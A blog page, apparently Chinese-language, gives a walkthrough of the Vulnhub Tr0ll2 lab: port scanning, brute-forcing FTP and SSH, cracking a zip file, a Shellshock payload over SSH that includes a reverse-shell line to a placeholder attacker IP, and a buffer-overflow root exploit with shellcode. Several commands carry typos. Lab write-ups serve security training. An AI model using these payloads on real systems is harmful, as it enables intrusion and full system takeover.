@@ -1,0 +1,809 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/hacker.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="m0nst3rer">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="信息收集首先使用nmap进行初步信息收集 12345sudo nmap -Pn --min-rate 10000 192.168.111.20   &#x2F;&#x2F;跳过主机扫描，把发包速率调至10000sudo nmap -sT -sV-p---min-rate 10000 192.168.111.20   &#x2F;&#x2F;全端口TCP服务扫描sudo nmap --top-ports 20 192.168.111.20">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tr0ll2">
+<meta property="og:url" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/index.html">
+<meta property="og:site_name" content="m0nst3rer&#39;Blog">
+<meta property="og:description" content="信息收集首先使用nmap进行初步信息收集 12345sudo nmap -Pn --min-rate 10000 192.168.111.20   &#x2F;&#x2F;跳过主机扫描，把发包速率调至10000sudo nmap -sT -sV-p---min-rate 10000 192.168.111.20   &#x2F;&#x2F;全端口TCP服务扫描sudo nmap --top-ports 20 192.168.111.20">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/c2ab2451a3d6b7456af2e9ad719426f.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/b1d5d234174c8be2600fef9cde178cb.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/9ff68f8dfaa08c1fa2b11304699065d.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328203954165.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328204505678.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328204848824.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328205030241.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328205141099.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328205424661.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328205726727.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328205902969.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/57c0d8be6fde6bb547accb1f641cdc8.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/8944dfe1d2b4aae957d721c5624832e.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/b627464ab39a93be38605a5a1d5850b.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328211016155.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/8fec985b08ecf7950c961398e363d69.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/1f490b9f1440a0371deb366b59ab44b.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/d65038d2ae4094eaebc1edf42ead58f.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/97754f0539995f4cb3d8a9c3aa14cb1.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/302f0a9a257ce17a2c9356b8dfe995e.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/45299ab5f2d57a255c0b9b6ac40b364.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328213820167.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328214025211.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328214222310.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328214932166.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/890d93e4bc050f8f4856d8dbbfb9986.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328221119219.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/6b282e9c520e6647b6ee1328caf4e93.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328222628108.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328223544038.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328223646297.png">
+<meta property="og:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/image-20260328225053424.png">
+<meta property="article:published_time" content="2026-03-28T15:22:29.000Z">
+<meta property="article:modified_time" content="2026-03-29T02:30:52.143Z">
+<meta property="article:author" content="m0nst3rer">
+<meta property="article:tag" content="Vulnhub">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://m0nst3rer.github.io/2026/03/28/Tr0ll2/c2ab2451a3d6b7456af2e9ad719426f.png">
+  
+  
+  
+  <title>Tr0ll2 - m0nst3rer&#39;Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"m0nst3rer.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title">m0nst3rer&#39;Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Tr0ll2"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-28 23:22" pubdate>
+          2026年3月28日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Tr0ll2</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先使用<code>nmap</code>进行初步信息收集</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nmap -Pn --min-rate 10000 192.168.111.20   //跳过主机扫描，把发包速率调至10000<br><br><span class="hljs-built_in">sudo</span> nmap -sT -sV-p---min-rate 10000 192.168.111.20   //全端口TCP服务扫描<br><br><span class="hljs-built_in">sudo</span> nmap --top-ports 20 192.168.111.20   //快速TOP端口扫描<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2026/03/28/Tr0ll2/c2ab2451a3d6b7456af2e9ad719426f.png" srcset="/img/loading.gif" lazyload alt="主机扫描"></p>
+<p><img src="/2026/03/28/Tr0ll2/b1d5d234174c8be2600fef9cde178cb.png" srcset="/img/loading.gif" lazyload alt="全端口TCP服务扫描"></p>
+<p><img src="/2026/03/28/Tr0ll2/9ff68f8dfaa08c1fa2b11304699065d.png" srcset="/img/loading.gif" lazyload alt="快速TOP端口扫描"></p>
+<p>根据以上信息可知靶机开放了21、22、80三个端口，先去看看80端口什么情况</p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328203954165.png" srcset="/img/loading.gif" lazyload></p>
+<p>只有一张图片，查看网页源码看到是用<code>vim</code>编辑器进行编辑</p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328204505678.png" srcset="/img/loading.gif" lazyload></p>
+<p>进行目录扫描发现了<code>robots.txt</code>文本文件，尝试访问是否有提示信息</p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328204848824.png" srcset="/img/loading.gif" lazyload alt="image-20260328204848824"></p>
+<p>访问后出现以下可能隐藏的目录，先访问<code>/noob</code>目录</p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328205030241.png" srcset="/img/loading.gif" lazyload></p>
+<p>又是一张图片，那依旧看一下网页源码</p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328205141099.png" srcset="/img/loading.gif" lazyload></p>
+<p>这次发现提示<code>cat</code>关键字很可能存在图片隐写，在找了上面所有目录后找到了图片中隐藏的信息</p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328205424661.png" srcset="/img/loading.gif" lazyload></p>
+<p>猜测<code>y0ur_self</code>可能是某个隐藏目录或文件</p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328205726727.png" srcset="/img/loading.gif" lazyload></p>
+<p>该目录下还存在一个<code>answer.txt</code>文本文件，打开后里面的内容全经过了base64加密</p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328205902969.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用命令<code>cat answer.txt | base64 -d &gt; pass.txt</code>解密后保存至<code>pass.txt</code>，使用用户名<code>Tr0ll</code>和<code>pass.txt</code>作为密码本进行爆破</p>
+<p><img src="/2026/03/28/Tr0ll2/57c0d8be6fde6bb547accb1f641cdc8.png" srcset="/img/loading.gif" lazyload alt="hydra爆破ssh服务"></p>
+<p><img src="/2026/03/28/Tr0ll2/8944dfe1d2b4aae957d721c5624832e.png" srcset="/img/loading.gif" lazyload alt="hydra爆破FTP服务"></p>
+<p>爆破了很久也没成功，那么先尝试手动登录FTP。发现使用用户名<code>Tr0ll</code>密码也为<code>Tr0ll</code>就能登录了</p>
+<p><img src="/2026/03/28/Tr0ll2/b627464ab39a93be38605a5a1d5850b.png" srcset="/img/loading.gif" lazyload></p>
+<p>有一个<code>lmao</code>压缩文件那么下载下来，使用<code>zip2john</code>破解工具进行破解压缩包密码</p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328211016155.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到一个<code>noob</code>密钥文件，查看可得到ssh的私钥key</p>
+<p><img src="/2026/03/28/Tr0ll2/8fec985b08ecf7950c961398e363d69.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是尝试登录时发现无法登录</p>
+<p><img src="/2026/03/28/Tr0ll2/1f490b9f1440a0371deb366b59ab44b.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用命令<code>ssh -vvv -i noob noob192.168.111.20</code>看看报了什么错</p>
+<p><img src="/2026/03/28/Tr0ll2/d65038d2ae4094eaebc1edf42ead58f.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="CVE-2014-6271-ShellShock漏洞"><a href="#CVE-2014-6271-ShellShock漏洞" class="headerlink" title="CVE-2014-6271  ShellShock漏洞"></a>CVE-2014-6271  ShellShock漏洞</h2><p>使用命令<code>ssh -i noob noob192.168.111.20-0 PubkeyAcceptedKeyTypes=+ssh-rsa</code>尝试<strong>强制客户端使用旧版签名算法</strong>依旧不行</p>
+<p><img src="/2026/03/28/Tr0ll2/97754f0539995f4cb3d8a9c3aa14cb1.png" srcset="/img/loading.gif" lazyload></p>
+<p>查阅资料发现可以使用<code>ShellShock</code>漏洞</p>
+<p><em>ShellShock：CVE-2014-6271，又称”破壳漏洞“，它影响了Unix&#x2F;Linux系统中的Bash解释器。它允许攻击者通过环境变量注入恶意代码，从而实现远程命令执行</em></p>
+<p>基本用法：<code>ssh -i id_rsa user@target &#39;() { :;}; /bin/bash -i &gt;&amp; /dev/tcp/攻击者IP/端口 0&gt;&amp;1&#39;</code></p>
+<p>构造Payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i noob -o pubkeyAcceptedAlgorithms=+ssh-rsa -0 HostKeyAlgorithms=+ssh-rsa nooba192.168.11.20 <span class="hljs-string">&#x27;()&#123; :;&#125;; cat /etc/passwd</span><br><span class="hljs-string"></span><br><span class="hljs-string">//-o PubkeyAcceptedAlgorithms=+ssh-rsa  添加 ssh-rsa 到公钥算法列表，允许使用已被弃用的 RSA/SHA-1 算法（兼容旧系统）</span><br><span class="hljs-string"></span><br><span class="hljs-string">//-o HostKeyAlgorithms=+ssh-rsa  添加 ssh-rsa 到主机密钥算法列表，允许连接使用 RSA/SHA-1 主机密钥的旧服务器</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2026/03/28/Tr0ll2/302f0a9a257ce17a2c9356b8dfe995e.png" srcset="/img/loading.gif" lazyload alt="成功读取&#x2F;etc&#x2F;passwd中的内容"></p>
+<p>构造反弹shell的Payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i noob -0 PubkeyAcceptedAlgorithms=+ssh-rsa -0 HostKeyAlgorithms=+ssh-rsa nooba192.168.11.20 <span class="hljs-string">&#x27;()&#123; :;&#125;; /bin/bash</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2026/03/28/Tr0ll2/45299ab5f2d57a255c0b9b6ac40b364.png" srcset="/img/loading.gif" lazyload alt="成功反弹shell获得初始交互"></p>
+<p>使用命令<code>find/-perm -4000 -print 2&gt;/dev/null</code>查找SUID权限的文件，发现可疑目录</p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328213820167.png" srcset="/img/loading.gif" lazyload></p>
+<p>cd过去查看发现有三个door，依次进去看看</p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328214025211.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现其中一个<code>r00t</code>文件大小存在差异，下载到本地进行分析。先把<code>door3</code>中的<code>r00t</code>文件base64加密后再拿到kali解密，gdb调试。</p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328214222310.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="缓冲区溢出漏洞"><a href="#缓冲区溢出漏洞" class="headerlink" title="缓冲区溢出漏洞"></a>缓冲区溢出漏洞</h2><p>使用<code>gdb</code>打开</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x r00t<br>(gdb) run r00t <br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/28/Tr0ll2/image-20260328214932166.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>strcpy</code>：<em>将源字符串复制到目标的缓冲区，<strong>不检查目标的缓冲区长度</strong>，可能导致缓冲区溢出。如果目标缓冲区（栈上的字符组）较小而源字符过长，<code>strcpy</code>则会覆盖栈上的返回地址，从而导致程序崩溃或被控制流劫持</em></p>
+<h2 id="计算偏移量"><a href="#计算偏移量" class="headerlink" title="计算偏移量"></a>计算偏移量</h2><p>使用<code>metasploit</code>框架中的<code>pattern_create.rb</code>工具，用来生成<strong>De Bruijn 序列</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./pattern create.rb -l 1000  //生成指定长度为1000字节/字符<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/28/Tr0ll2/890d93e4bc050f8f4856d8dbbfb9986.png" srcset="/img/loading.gif" lazyload></p>
+<p>找到溢出的位置为<code>0x6a413969</code></p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328221119219.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用另一个工具<code>pattern offset.rb</code>计算偏移量，用于确定EIP&#x2F;RIP寄存器在崩溃时被覆盖的具体位置。得到偏移量为<code>268</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./pattern offset.rb -g 0x6a413969 -l 1000<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2026/03/28/Tr0ll2/6b282e9c520e6647b6ee1328caf4e93.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过以下Python语句生成特定的溢出Payload来测试缓冲区溢出漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) r $(python -c <span class="hljs-string">&#x27;print(&quot;A&quot;*268 + &quot;B&quot;*4)&#x27;</span>)<br><br>//$(...)，执行括号内的命令并替换为输出<br><br>//<span class="hljs-string">&quot;A&quot;</span>*268，生成268个字符A填充缓冲区<br><br>//<span class="hljs-string">&quot;B&quot;</span>*4，生成4个字符B覆盖EIP<br></code></pre></td></tr></table></figure>
+
+
+
+<p>可以看到268个字符完美填充，第 269-272 字节精确覆盖返回地址<code>0x42424242</code></p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328222628108.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查阅资料寻找对应版本的Payload</p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328223544038.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看具体用法</p>
+<p><img src="/2026/03/28/Tr0ll2/image-20260328223646297.png" srcset="/img/loading.gif" lazyload></p>
+<p>构造完整Payload，成功提权至root权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./r00t $(python -c <span class="hljs-string">&#x27;print &quot;A&quot;*268 + &quot;\x80\xfb\xff\xbf&quot; + &quot;\x90&quot;*20 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/28/Tr0ll2/image-20260328225053424.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>参考文章</strong>：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Bugatti100Peagle/article/details/148087227">https://blog.csdn.net/Bugatti100Peagle/article/details/148087227</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sallyzhang/p/17086366.html">https://www.cnblogs.com/sallyzhang/p/17086366.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://shell-storm.org/shellcode/index.html">https://shell-storm.org/shellcode/index.html</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/type/" class="category-chain-item">type</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Vulnhub/" class="print-no-link">#Vulnhub</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Tr0ll2</div>
+      <div>https://m0nst3rer.github.io/2026/03/28/Tr0ll2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>m0nst3rer</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/20/Lord-of-the-root/" title="Lord_of_the_root">
+                        <span class="hidden-mobile">Lord_of_the_root</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+<div>
+  <span id="timeDate">正在载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("09/01/2024 00:00:00");
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";  
+      document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+  }
+  setInterval("createtime()",250);
+  </script>
+</div>
+
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
